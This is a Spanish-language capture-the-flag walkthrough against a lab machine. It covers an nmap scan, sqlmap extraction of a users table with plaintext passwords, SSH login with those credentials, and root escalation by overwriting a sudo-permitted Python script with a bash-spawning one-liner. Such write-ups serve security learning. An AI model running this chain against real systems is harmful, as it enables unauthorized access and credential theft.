===ENUMERACIÓN===

Empezaremos lanzando un nmap a la ip de la máquina objetivo 

```
sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -n -vvv -Pn 172.18.0.2
```

Y este es el resultado:

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 ea:6b:ef:51:9c:00:c4:d4:24:17:90:be:6d:0a:26:79 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP8i149J/z+cyzaGJoDVXl5AHyo4BO3C5DzkkWxzNaB77Kpz4si3PNs2uorTw1yztfmGmCA8NIWeW+TAybx57ok=
|   256 62:97:b5:91:0c:b0:8f:06:bd:ad:e3:d5:14:3d:f1:74 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINpY2NxmXtsHt71QdxZpHfmnjsqGymscWq6lf4kbIkVk
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: User Search
|_http-server-header: Apache/2.4.59 (Debian)
```

===EXPLOTACIÓN===

Iremos al puerto 80, la página web, donde vemos una web para buscar usuarios.

Al hacer una inyección sql manual no conseguimos explotarlo, probemos con *sqlmap*:

```
sqlmap --url http://172.18.0.2/ --dbs --forms --batch

[20:36:39] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] testdb
```

Nos saca la base de datos *testdb* , iremos por ahí para seguir sacando información. Ejecutamos el siguiente comando para ver que contiene:

```
sqlmap --url http://172.18.0.2/ -D testdb  --tables --forms --batch

[20:39:52] [INFO] fetching tables for database: 'testdb'
Database: testdb
[1 table]
+-------+
| users |
+-------+
```

Nos saca la tabla users, seguiremos haciendo inyecciones sql por aquí.
Con el siguiente comando veremos las columnas de la tabla users:

```
sqlmap --url http://172.18.0.2/ -D testdb -T users --columns --form --batch

Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(11)     |
| password | varchar(50) |
| username | varchar(50) |
+----------+-------------+
```

Parece que vamos bien, ahora vamos a terminar la explotación sacando el contenido de estas dos columnas:

```
sqlmap --url http://172.18.0.2/ -D testdb -T users -C username,password --dump --columns --tables --forms --batch

Table: users
[3 entries]
+----------+---------------+
| username | password      |
+----------+---------------+
| admin    | adminpassword |
| user1    | user1password |
| kvzlx    | kvzlxpassword |
+----------+---------------+
```

Ahora al tener credenciales, probaremos entrar por ssh, he intentado acceder empezando por el usuario *admin* pero el único que tiene acceso por ssh es el usuario *kvzlx*

```
ssh kvzlx@172.18.0.2
```

===ESCALADA DE PRIVILEGIOS===

Para la escalada de privilegios siempre opto por hacer primero *sudo -l* y esta vez tuvimos suerte:

```
kvzlx@a590b61b572c:~$ sudo -l
Matching Defaults entries for kvzlx on a590b61b572c:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User kvzlx may run the following commands on a590b61b572c:
    (ALL) NOPASSWD: /usr/bin/python3 /home/kvzlx/system_info.py
```

Vemos que podemos ejecutar con python3 como root el script que se encuentra en la home de kvzlx. Vamos a ver que contiene dicho script:

```
import psutil


def print_virtual_memory():
    vm = psutil.virtual_memory()
    print(f"Total: {vm.total} Available: {vm.available}")


if __name__ == "__main__":
    print_virtual_memory()
```

Nada por lo que yo vea que me interesa. No tenemos permisos de escritura. Pero si tenemos permisos de escritura en la home de kvzlx. Por tanto vamos a cambiar el nombre del script que viene y crearemos nuestro propio script para que nos devuelva una bash como root:

```
mv /home/kvzlx/system_info.py /home/kvzlx/original.py
```

Ahora con echo creamos un script para poder ejecutarlo y que nos de la shell de root:

```
echo 'import os; os.system("/bin/bash")' > /home/kvzlx/system_info.py
```

Este script lo hemos sacado de gtfobins, al tener poder ejecutar como root python3.
Ahora ejecutamos el script:

```
kvzlx@a590b61b572c:~$ sudo /usr/bin/python3 /home/kvzlx/system_info.py

root@a590b61b572c:/home/kvzlx# whoami
root
```

Y finalmente pwned ;)